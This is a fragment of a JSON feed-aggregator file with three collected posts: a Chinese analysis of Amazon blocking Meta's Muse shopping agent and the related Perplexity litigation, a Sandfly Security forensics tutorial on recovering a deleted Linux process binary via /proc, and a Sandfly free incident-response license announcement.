+      "target_url": "https://yage.ai/share/amazon-ai-shopping-agent-blocking-20260927.html",
+      "text": "yage-share published: Amazon 能封住替你购物的 AI 吗？",
+      "at": "2026-09-29T00:00:00+00:00",
+      "external_id": "a:3c81dd891da55543",
+      "url": "https://yage.ai/share/amazon-ai-shopping-agent-blocking-20260927.html",
+      "title": "Amazon 能封住替你购物的 AI 吗？",
+      "content": "AI Agent\n产业与竞争\n治理与合规\nMuse 连搜索页都没进去\n今年 5 月，我在\n《Google\n关掉 Project Mariner，Anthropic 和 OpenAI\n其实也没跑通》\n里写过，独立浏览器助手在面对网站反爬机制时连连碰壁，行业开始把方向转回用户自己的日常浏览器。4\n个月后，战场上出现了一起引人注目的新事件。2026 年 9 月，Meta\n推出云端助手\nMuse，尝试替用户跑腿浏览网页、处理待办并去电商网站购物。但在购物这项核心能力上，它刚上线就撞到了铁板。\nThe\nRegister 记者的实测记录显示\n，测试者让 Muse 去 Amazon\n寻找评价最好的工学办公椅，加入购物车，并推进到最后的结账页面。整个流程还没展开就停住了。Muse\n没找到椅子，也没能加购，而是在对话框里坦白：\n浏览器连搜索页都没能进去，所以没找到椅子，也没加购物车\n。报道还附上了\nAmazon 拦截页面的截图。\n这并不是说 Muse 从未在 Amazon 买成过东西。\nThe\nVerge 记者的报道提到\n，此前曾经用 Muse 在 Amazon\n上成功买过背心。也就是说，过去的成功并不能保证后续的通行，Amazon\n随后关闭了通道。\n围绕这次阻断，\nGeekWire\n拿到了 Amazon 弹出的现场警告和说明\n。Amazon\n在弹窗提示里说，一个没经它同意的 AI\n程序在反复访问网站，这违反了用户此前同意的服务条款。按照 Amazon\n的说法，他们此前就已经要求 Meta 把 Amazon 排除在代办范围之外。Amazon\n还指责 Muse\n访问时没有自报家门，说它似乎在收集并存储用户的账号密码，甚至可能根据用户指令调取历史订单。\n面对账号密码安全的质疑，Meta 在封锁发生前的 9 月 8 日，就在\n官方安全文档中\n写明了系统设计：用户输入的密码会直接进入隔离的安全存储区域，负责推理的主模型本身看不到明文密码；只有网页确实需要登录认证，系统才会把密码注入浏览器窗口。两边的表态完全没有接上。Meta\n解释的是密码在自己系统里怎么隔离和加密，回答的是会不会泄密；Amazon\n质问的是一个没经它允许的外部程序凭什么进店跑腿。技术上把密码保管得再严密，也只回答了防不防泄密，没有回答平台愿不愿意给跑腿软件开门。\n这就引出了一个关键疑问：如果厂商部署在云端的服务器容易让电商平台认出来并直接阻断，那么把浏览器搬回用户自己的电脑上呢？如果让本地运行的浏览器带着真实的登录状态，由\nAI 在后台辅助操作，网站还能这样干脆地把门关上吗？\n同样是AI点击，网站看到的不同\n同样是去挑选办公椅并放进购物车，最直观的区别是究竟谁的电脑在打开\nAmazon。在云端代办模式下，你在聊天框里输入要求，真正打开商城的其实是厂商机房里的服务器。根据\nMeta 的官方安全文档\n，Muse\n为每个用户分配了数据中心里的云电脑与远端浏览器，所有的翻页、点击和输入全在机房里完成。\n对电商平台来说，这种模式特征明显。海量的购物请求集中在厂商的机房，脱离了千家万户分散的宽带。如果平台能认出这些连接来自哪些服务器出口，就可以把来自这些出口的请求成组拦在门外。机房服务器虽然不一定独占网段，批量封锁出口也可能误伤同网段的其他租户，但比起分散各地的家庭宽带，机房出口依然是平台手里相对集中的识别线索。\n换到用户自己的电脑上，情形就变了。你在自己的桌前打开平时用的日常浏览器。根据\n独立安全机构对桌面智能助手的逆向分析\n，模型虽然在云端负责推理和规划，但具体的操作指令是发给本地浏览器插件。所有的点击和跳转都在你眼前的屏幕上真实发生，发出的网络请求也是从你家里的宽带发出去。\n接收请求的电商网站此时看到的是什么？它看到的是一台有着正常软硬件参数的日常设备，带着你平时积累的\nCookie\n和真实登录状态，从一个普通的家庭网络发起访问。平台此前对付机房出口的那套批量封锁方法，在这里直接失效了。不过必须说明，设备上保留着已有登录状态，并不代表自动化操作在法律或服务条款上就获得了当然的许可。\n但这不意味着本地操作毫无痕迹。浏览器虽然跑在本地，操作过程依然会留下特征。除了检查请求来源与登录状态，电商平台也可以综合操作模式与客户端特征来进行\n机器人与风险评估\n。比如自动化程序在商品列表里翻页太快，或者在不同标签页之间切换的节奏反常，这些模式依然可能触发风控警报。\n但对平台来说，单纯依靠行为特征去拦截本地设备，要承担误伤的代价。自动化行为与真人习惯之间存在重叠地带：一个熟练比价的真人顾客，在抢购或者挑选打折商品时，同样会快速刷新页面、连续点击对比多个链接。如果平台把检测门槛调得太紧，就会把真实买家当成机器人拦在外面。打断真实顾客的购物流程，会损害用户体验并导致订单流失。这种误伤的商业代价，平台必须自己吞下去。\n浏览器在用户电脑还是厂商云端，改变了网站能够辨认的访问来源。\n法庭把法律风险讲清楚了\n浏览器究竟放在本地还是云端，不只是工程架构的选择，更已经在实际诉讼中变成了双方争执的核心。今年\n5 月的那篇文章提到，Amazon 起诉了 Perplexity 旗下的 Comet\n浏览器，指控它未经授权自动化访问商城，触犯了规范未授权计算机访问的\n美国反黑客法律\nCFAA\n。当时初审法院对 Perplexity 颁布了初步禁令，Perplexity\n随即提出上诉，读者当时看到的最新节点是双方等待 5 月 15 日的听证。\nComet 浏览器恰好把本地和云端两种架构都试了一遍。在桌面端，\n独立安全机构的逆向分析显示\n，Comet\n走的是本地路线：由云端模型规划操作步骤，再由用户本地的浏览器扩展在窗口中执行导航与点击。\n但在 iOS 移动端上，Comet 的早期测试走了另一条路。MacStories\n当时写道：\nComet\nfor iOS 的 agent 不会在 iOS\n应用内部替你浏览网页，而是在云端为你创建一个虚拟浏览器\n。为了让这个远端虚拟浏览器拥有登录身份，应用在提示用户后把临时的登录\nCookie 上传到了云端。\n这场诉讼在 2026 年 8 月 4\n日迎来了转折性进展。美国联邦第九巡回上诉法院作出一项长达 21\n页的重要裁决：\n撤销原审法院针对\nPerplexity 颁布的初步禁令，并将案件发回原审法院继续审理\n。\n我翻到第九巡回法院这份意见书时，发现法官关注的核心其实只有一个：在法律意义上，究竟是谁在发起对\nAmazon 计算机的访问？\n依据当时案卷记录，上诉法院指出，虽然 Perplexity\n的云端系统向本地发送了操作指令，但实际发出访问请求的依然是坐在电脑前、借助辅助工具开展具体操作的消费者本人。法官在意见书第\n15 页写道：\n真正访问\nAmazon 计算机的，是借助辅助工具在 Amazon.com\n上执行具体操作的用户本人\n。换句话说，按当时的案卷记录，是消费者本人借助工具访问了\nAmazon 的计算机，法院在这份记录上并没有把 Perplexity\n认定为法律意义上的访问者。\n不过，必须讲清楚的是，撤销初步禁令不等于 Perplexity\n赢下了整场官司，更不代表本地工具就拥有不受限制的合法通行权。上诉法院法官在判决附注中作出了严格保留。意见书第\n21 页第 5 条附注明确写道：\n这一结果并不妨碍\nAmazon 通过面向用户的私有服务条款来规范对 Amazon.com\n的访问\n。这项裁决丝毫不会削弱 Amazon\n依据自身服务条款去约束其用户的权利。法院既没有判定所有本地运行的辅助工具都合法，也没有否定平台通过私人契约管理商城的权力，更没有对案件中诸如经济损失等其他法律要件作出终局认定。\n随后，进攻方的火力点迅速发生了转移。2026 年 9 月 21 日，\nAmazon\n正式向法院提交了修订后的新诉状\n。在这份新诉状里，Amazon\n调整了诉讼策略。除了继续坚持原有的反黑客法诉求外，Amazon\n新增了一项民事侵权指控：故意干预合同关系（Tortious Interference with\nContractual Relations）。Amazon 指控 Perplexity\n故意诱导并协助用户规避和违反他们此前同意的网站使用条款。\n同时，Amazon 把目光重点转向了 Comet 在移动端的做法。针对 MacStories\n记录的 iOS 云端虚拟浏览器，Amazon\n主张这种由云端服务器直接连接商城的行为属于未经授权的直连。此外，诉状还指控\nPerplexity 在 2025\n年经历两轮技术封锁后故意更新软件绕过防御。目前，这些新指控尚未经过法庭审理。\n从这份 8 月的法庭裁决和 9\n月的新诉状中，我们可以清楚地看出法律风险是如何随着系统架构而分叉的：如果是本地执行架构，由本地浏览器出面操作，那么在反黑客法（CFAA）关于未授权计算机访问的指控上，厂商承受的法律压力明显减轻。因为法庭目前更倾向于认定这是消费者借助工具访问，而非外部黑客程序直接入侵。但这不代表没有法律风险，用户违反平台服务条款的违约责任，以及厂商面临的诱导违约侵权指控，依然是悬在头顶的现实风险。\n如果退回云端直连架构，由厂商的机房服务器或云端虚拟浏览器直接访问商城，平台立刻就能重新抓住未授权机房直接连入这一点，在反黑客法上组织起全新的攻击面。此前行业讨论的从云端退回用户客户端，在法律层面到底带来了什么改变、又留下了什么隐患，在这两份法律文件中有了清晰的回答。\n广告是卖给真人看的\n在法庭诉讼和条款争议之外，平台心里其实还有一笔经济账。很多人以为电商平台拦截跑腿软件，是担心外部程序抢走订单。但从交易本身来看，有人替顾客下单，买卖照旧发生，平台同样能拿到商品价差或者商家的销售佣金，成交环节的损失其实有限。\n平台真正受损的地方，在搜索和浏览背后的广告收入。商家在电商网站上花钱购买搜索排名和推荐橱窗，买的是活生生的人类注意力。我翻看\nAmazon\n2025\n年的年度报告\n，年报写明广告收入按照点击或曝光来计量。广告主愿意付费，是因为广告能吸引真人、影响真人的购买决定，进而促成点击。\nAI\n助手的浏览方式却完全不同。如果你让它去挑选二十个商品页，它会在短时间内打开大量页面，却不会受广告影响。从技术逻辑推演，自动化程序在解析页面代码时，能够分清哪个是广告位、哪个是自然搜索结果。当然，agent\n能分辨广告位属于分析推演，并不是 Amazon\n官方公布的实测数据。面对这些页面，AI\n只抽取商品价格、规格参数和买家评价，完全避开花钱推广的内容。\n这就带来了一个让平台头疼的局面：这些页面原本能向真人展示广告、赚取点击费，而\nagent\n的浏览把广告赖以成立的那个注意力环节拿掉了。按这个推演，外部助手在免费消耗商城的浏览页面，页面本身的广告价值却很难兑现。这也是平台必须在浏览层防范外部流量的核心动机。\n不过，评估这笔损失也要看清体量。Amazon 2025\n年年报显示，公司全年总净营收约 7170 亿美元，其中广告服务收入约 686\n亿美元，占比不到一成。广告虽然增速较快，但不是平台的营收大头。AI\n浏览冲击的是依附在商品展示上的广告层，并不是整个商业模式。\n平台既想守住展示页面的广告价值，又不能把接入 AI\n的趋势挡在门外。这种复杂的经济考量，直接解释了为什么各大巨头在技术上严加防守的同时，又悄悄坐到了同一张谈判桌前。\n同一个商品页，人看到广告会被影响，机器只抽取参数。\n为什么一边封锁，一边合作\n如果只看商城前端的技术封锁与法庭诉讼，各大科技公司似乎水火不容。但在商业标准的制定现场，展现出的却是另一番景象。\n2026 年 4 月 24 日，协议参与方宣布，\nAmazon、Meta、微软、Salesforce\n与 Stripe 共同加入了通用商业协议 UCP 技术委员会\n。在\nUCP\n这个开放协议\n中，各方共同坐下来讨论通用的商品发现、购物车管理与结账流程规范。在此之前的\n1 月，\nGoogle\n也联合 Shopify、Target、Walmart 等零售巨头推进 UCP\n落地\n，并在协议框架中明确指出零售商保留其作为法定销售方的地位，牢牢把控交易控制权与客户关系。\n4 月份还在共同起草行业标准，到了 9 月份，Amazon 照样在商城里封锁了\nMeta 的\nMuse。这组对比说明：坐在一起商量接口协议，与自家的商场愿不愿意向外部程序开门，完全是两码事。协议解决连接格式，不解决准入许可。参与标准制定不会自动开放商城，平台依然在控制自己的流程，相关的条款效力与法律争议如前文所述仍未定论。\n各大 AI 厂商在具体的落地方式上也在摸索调整。OpenAI\n此前曾尝试让交易留在对话框内，于 2025 年 9 月联合 Stripe 推出 Instant\nCheckout 和 ACP 协议。但在实际运行近半年后，OpenAI 在\n2026\n年 3 月 24\n日做出了调整\n。官方坦言最初的即时结账不够灵活，决定允许商家使用自己的结账流程。官方说明的原话是：\n我们发现第一版\nInstant Checkout\n没有达到我们希望提供的灵活度，因此允许商家使用自己的结账体验，我们则把重心放到商品发现上\n。\n根据\nShopify\n的官方说明\n，如今 ChatGPT\n用户挑好商品后，是通过应用内浏览器进入商家网站完成结账。商家掌控结账流程与用户关系，聊天助手负责前期的寻找与推荐。Google\n的支持文档显示，\nGemini\nSpark 既可以连接用户本地 Chrome\n浏览器复用登录状态，也可以使用远端浏览器环境\n。\n在身份标记上，技术实现同样不等于准入许可。OpenAI 在云端浏览器\n说明文档中介绍\n，系统会用数字签名给外发请求附上可验证的身份，以便目标网站核验请求确实来自\nChatGPT。但这只是证明流量来自谁，网站核验后是放行还是阻断，依然由网站自己决定。自报身份不等于拿到门票。\nAmazon 自身的产品做法也体现了这种控制逻辑。在企业服务领域，Amazon\n推出了\n面向机构采购的业务订购接口\nBusiness Ordering\nAPI\n。但这套接口面向特定合作方，有着严格的准入与授权，是一条限定的企业采购专供通道，不是通用的开放准入。\n而在面向外部商城时，Amazon 自己也在购物应用中推出了\n代办功能\nBuy for Me\n，替用户前往第三方商城采购商品。\nAmazon\n表示其代办请求会自报身份\n，并提供了\n允许商家通过邮件申请退出的机制\n。不过，允许事后退出不代表事先得到同意，\n此前也有独立品牌对商品未经沟通便纳入代办表达了异议\n。\n回到最初买办公椅的场景：技术能把浏览器从机房搬到本地，缩小网络层面的可见差异；算法也可以把操作节奏模拟得越来越像真人；行业协议也能统一数据交互格式。但只要交易发生在他人的商城里，平台依然在控制自己的网站流程、流量和广告收入，相关的条款效力与法律争议仍未定论。决定购物助手能否替人把商品买回家的，不仅在于软件能把网页操作得多熟练，也在于那家店铺在看到有人替顾客跑腿时，究竟愿不愿意把门推开。\n额外来源\n本次事件与双方说法\n-\nThe\nRegister：Amazon 把 Meta 的 Muse\n挡在了门外\n（2026-09-21，记者实测与拦截页截图） -\nGeekWire：Amazon\n封锁 Meta 的 Muse\n（2026-09-20，弹窗警告与 Amazon 单方说明） -\nThe\nVerge：Amazon 拦截 Muse 购物\n（2026-09-21，此前成功买过背心的报道） -\nMeta Muse\n官方安全文档\n（2026-09-08，凭证隔离设计，早于封锁）\n法律文件与独立分析\n-\n第九巡回上诉法院意见书（2026-08-04，21\n页 PDF）\n-\nAmazon\n诉 Perplexity 案卷，含 2026-09-21 修订诉状\n-\nMacStories：iOS\n版 Comet 上手评测\n（2026-03-18，iOS 早期版上手记录） -\nZenity\nLabs：对 Comet 桌面端的独立逆向分析\n财报与行业动作\n-\nAmazon\n2025 年年报\n（广告收入按点击/曝光计量；2025 广告收入约 686 亿美元） -\nUCP\n技术委员会新闻稿\n（2026-04-24）与\nUCP\n项目站\n-\nGoogle：与零售商共建\nagentic commerce\n（2026-01-11）与\nGemini\nSpark 支持文档\n-\nOpenAI：Instant\nCheckout 调整说明\n（2026-03-24）与\nChatGPT\n云端浏览器文档\n-\nShopify：agentic\ncommerce 如何运作\n（2026-06-18） -\nAmazon\nBusiness Ordering API 文档\n、\nBuy\nfor Me 发布说明\n与\n商家退出机制页面\n-\nModern\nRetail：品牌对 Buy for Me 未经沟通收录商品表达异议\n（2026-01-06）\n本站前文\n-\nGoogle\n关掉 Project Mariner，Anthropic 和 OpenAI\n其实也没跑通\n（2026-05-11）",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/amazon-ai-shopping-agent-blocking-20260927.html",
+      "content_chars": 7088,
+      "content_sha256": "77d16d01df967af5f26e474c6b686d0b1506382c25c3e722dad3be183dce8bbd",
+      "content_fetched_at": "2026-09-30T00:17:24.470806+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-09-29T00:00:00+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/amazon-ai-shopping-agent-blocking-20260927.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "Amazon 能封住替你购物的 AI 吗？",
+          "url": "https://yage.ai/share/amazon-ai-shopping-agent-blocking-20260927.html",
+          "content_sha256": "77d16d01df967af5f26e474c6b686d0b1506382c25c3e722dad3be183dce8bbd"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:180da5a8deb045af",
+      "who": "sandflysecurity-blog",
+      "who_url": "https://sandflysecurity.com/blog",
+      "action": "publish",
+      "target": "How To Recover A Deleted Binary From Active Linux Malware",
+      "target_url": "https://sandflysecurity.com/blog/how-to-recover-a-deleted-binary-from-active-linux-malware",
+      "text": "sandflysecurity-blog published: How To Recover A Deleted Binary From Active Linux Malware",
+      "at": "2026-09-28T19:01:16+00:00",
+      "external_id": "a:180da5a8deb045af",
+      "url": "https://sandflysecurity.com/blog/how-to-recover-a-deleted-binary-from-active-linux-malware",
+      "title": "How To Recover A Deleted Binary From Active Linux Malware",
+      "content": "2 min read\nHow To Recover A Deleted Binary From Active Linux Malware\nSandfly Security - Agentless Linux EDR and Incident Response\nSeptember 28, 2026\nRootkits\nMalware\nLinux Security\nLinux Forensics\nOften, Linux malware will delete itself after it starts so that file scanners and integrity checks won’t see the binary present. It also can make forensic analysis harder if you can’t get to the binary easily. However, it is easy to recover a deleted process binary on Linux as long as the process is still in memory. Let’s take a look.\nRecovering a Deleted Linux Process Binary Command\nThe basic command to recover a deleted process binary is simple. Just do the following:\ncp /proc/<PID>/exe /tmp/recovered_bin\nWhere <PID> is the Process ID of the deleted process you want to recover. The above command will copy the binary to\n/tmp/recovered_bin\nso you can do with it what you will.\nPracticing Recovery of a Deleted Process\nWe’re going to use the\nsleep\ncommand to simulate a process that has deleted itself from the disk. You can run this series of command safely on your own Linux system so you can practice recovery of a deleted binary.\ncd /tmp\ncp /bin/sleep x\n./x 3600 &\nrm x\nNow check that the binary is in fact gone:\nls -al /tmp/x\nls: cannot access /tmp/x: No such file or directory\nThe above copies the\nsleep\ncommand as “x” under\n/tmp\nand runs for 3600 seconds and then exits. We then delete “x” so they system binary appears removed.\nYou can see the process still running in the\nps\nlisting below.\nForensics Examination of Linux /proc for a Deleted Process\nNow let’s look at the\n/proc\ndirectory for this process. The\n/proc\nfilesystem is a special filesystem on Linux that tracks almost all kernel and process information you would ever want.\nUnder\n/proc\nthe system flagged the binary as deleted. The command format is:\nls -al /proc/<PID>/exe\nWhere again <PID> is the process ID we’re interested in like so:\nls -al /proc/12725/exe\nlrwxrwxrwx 1 root root 0 May 23 19:39 /proc/12725/exe -> /tmp/x (deleted)\nRecovery of Deleted Linux Process\nBut, the Linux file system will not actually delete that file\nas long as a running process still has it open\n. The file is there, but it simply is not being shown to you any more.\nThis\n/proc/12725/exe\nlink will easily get you the binary that started the process. Simply copy it to where you want and the binary that was deleted is now yours:\ncp /proc/12725/exe /tmp/recovered_bin\nThe hashes of the recovered binary and the\nsleep\ncommand that we used to emulate the attack are identical which proves the file recovered correctly.\nsha1sum /tmp/recovered_bin\nd76373f39b93bbc5191e5f8ca0f9c2f692e5aa71 /tmp/recovered_bin\nsha1sum /bin/sleep\nd76373f39b93bbc5191e5f8ca0f9c2f692e5aa71 /bin/sleep\nYou can now use this binary for further analysis as you wish such as a quick look with\nstrings\nor disassembler of your choice.\nNever Kill a Suspicious Process Blindly\nThe above is reason 4,387 to never simply kill a suspicious process you find until you have\nthoroughly investigated what is going on\n. If you were to kill the process first,\nyou’d lose the binary as it would be released by the filesystem and likely destroyed\n.\nIf a system is infected with something, isolate it on the network and then take your time and look around. Do not go in with guns blazing because you will destroy critical data.\nAs we advise in the\nLinux command line forensics cheat sheet\n:\nDon’t Panic\n. Take your time, collect your evidence, and only then rebuild the system after you’ve figured out what is going on and how the attack happened (root cause analysis). What’s the point of rebuilding a box if you don’t know how the person entered and whether they’ll just do the same thing again immediately when you bring it back online?\nFinally, did you know that Sandfly’s agentless Linux security platform automatically hunts for deleted processes and grabs forensic data about the situation for you?\nWhy not give it a try?\nTweet\n1 min read\nBasic Linux Malware Process Forensics for Incident Responders\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nSep 29, 2026, 7:58:25 AM\nPublication date: 30 September 2019\nRootkits\nMalware\nLinux Security\nLinux Forensics\nRead More\n1 min read\nDetecting Linux Binary File Poisoning\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nSep 29, 2026, 7:58:58 AM\nPublication Date: 13 June 2018\nRootkits\nMalware\nLinux Security\nLinux Forensics\nRead More\n1 min read\nLinux Scales eBPF Rootkit Detection and Analysis\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nSep 29, 2026, 8:00:31 AM\nSandfly Blog Linux Scales eBPF Rootkit Detection and Analysis 24 June 2026 Rootkits\nRootkits\nMalware\nLinux Forensics\nRead More",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://sandflysecurity.com/blog/how-to-recover-a-deleted-binary-from-active-linux-malware",
+      "content_chars": 4698,
+      "content_sha256": "ef296e64a7c2c1b82184a4085d4e3dd28880adcd863fbaf5bffac09c28dce365",
+      "content_fetched_at": "2026-09-30T00:17:55.956716+00:00",
+      "author": "sandflysecurity-blog",
+      "author_name": "Sandfly Security Blog",
+      "author_url": "https://sandflysecurity.com/blog",
+      "published_at": "2026-09-28T19:01:16+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:sandflysecurity-blog",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://sandflysecurity.com/blog",
+        "https://sandflysecurity.com/blog/how-to-recover-a-deleted-binary-from-active-linux-malware"
+      ],
+      "refs": {
+        "actor": {
+          "login": "sandflysecurity-blog",
+          "url": "https://sandflysecurity.com/blog"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "sandflysecurity-blog",
+          "name": "Sandfly Security Blog",
+          "home_url": "https://sandflysecurity.com/blog"
+        },
+        "article": {
+          "title": "How To Recover A Deleted Binary From Active Linux Malware",
+          "url": "https://sandflysecurity.com/blog/how-to-recover-a-deleted-binary-from-active-linux-malware",
+          "content_sha256": "ef296e64a7c2c1b82184a4085d4e3dd28880adcd863fbaf5bffac09c28dce365"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:e23a49faa4887d9a",
+      "who": "sandflysecurity-blog",
+      "who_url": "https://sandflysecurity.com/blog",
+      "action": "publish",
+      "target": "Free Sandfly Linux Incident Response License",
+      "target_url": "https://sandflysecurity.com/blog/free-sandfly-linux-incident-response-license",
+      "text": "sandflysecurity-blog published: Free Sandfly Linux Incident Response License",
+      "at": "2026-09-28T19:01:11+00:00",
+      "external_id": "a:e23a49faa4887d9a",
+      "url": "https://sandflysecurity.com/blog/free-sandfly-linux-incident-response-license",
+      "title": "Free Sandfly Linux Incident Response License",
+      "content": "1 min read\nFree Sandfly Linux Incident Response License\nSandfly Security - Agentless Linux EDR and Incident Response\nSeptember 28, 2026\nLinux Security\nLinux Forensics\nSandfly is offering free licenses for incident response teams.\nSandfly's agentless deployment on Linux makes it compatible, fast, and safe giving it unparalleled capability for incident response. Our free license allows teams to get help immediately during an incident.\nGet your free license here:\nFree Linux Incident Response License\nSandfly investigates Linux systems in seconds and the free license allows security teams to:\nDeploy our extensive compromise tactics detection.\nUse our agentless password auditor to find high risk accounts.\nLeverage our SSH Hunter to find, track, and audit SSH keys, who is using them, where they are being used, and much more.\nUtilize drift detection to find systems that are using unknown processes, users, scheduled tasks, files, and other unauthorized changes.\nBuild custom detection modules to do tailored threat hunting.\nInvestigate privately and discreetly as no data is ever sent to Sandfly or any third-party.\nDealing with an incident can be stressful, especially when many different versions and configurations of Linux are in play. Let Sandfly do the investigation and get answers in seconds. Reach out today with any questions. We are here to help.\nTweet\n1 min read\nLinux Hacked | Linux Hacking | Christchurch Hacker Con 2017 Linux Forensics Slides\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nMay 29, 2018, 7:00:00 AM\nPublication Date: 29 May 2018\nLinux Security\nLinux Forensics\nPresentations\nRead More\n1 min read\nDetecting Linux Kernel Process Masquerading with Command Line Forensics\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nMar 30, 2020, 8:00:00 AM\nPublication Date: 30 March 2020\nRootkits\nMalware\nLinux Security\nLinux Forensics\nRead More\n1 min read\nUsing Command Line Tools to Find Process Masquerading Linux Malware\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nFeb 27, 2019, 8:00:00 AM\nP u blication Date: 27 February 2019\nRootkits\nMalware\nLinux Security\nLinux Forensics\nRead More",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://sandflysecurity.com/blog/free-sandfly-linux-incident-response-license",
+      "content_chars": 2158,
+      "content_sha256": "b989add8705e122b1267d258d4c42f4c5e818ed03440fee1966c104ac930e28b",
+      "content_fetched_at": "2026-09-30T00:17:56.049546+00:00",
+      "author": "sandflysecurity-blog",
+      "author_name": "Sandfly Security Blog",
+      "author_url": "https://sandflysecurity.com/blog",
+      "published_at": "2026-09-28T19:01:11+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:sandflysecurity-blog",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://sandflysecurity.com/blog",
+        "https://sandflysecurity.com/blog/free-sandfly-linux-incident-response-license"
+      ],
+      "refs": {
+        "actor": {
+          "login": "sandflysecurity-blog",
+          "url": "https://sandflysecurity.com/blog"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "sandflysecurity-blog",
+          "name": "Sandfly Security Blog",
+          "home_url": "https://sandflysecurity.com/blog"
+        },
+        "article": {
+          "title": "Free Sandfly Linux Incident Response License",
+          "url": "https://sandflysecurity.com/blog/free-sandfly-linux-incident-response-license",
+          "content_sha256": "b989add8705e122b1267d258d4c42f4c5e818ed03440fee1966c104ac930e28b"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    }
+  ]
 }
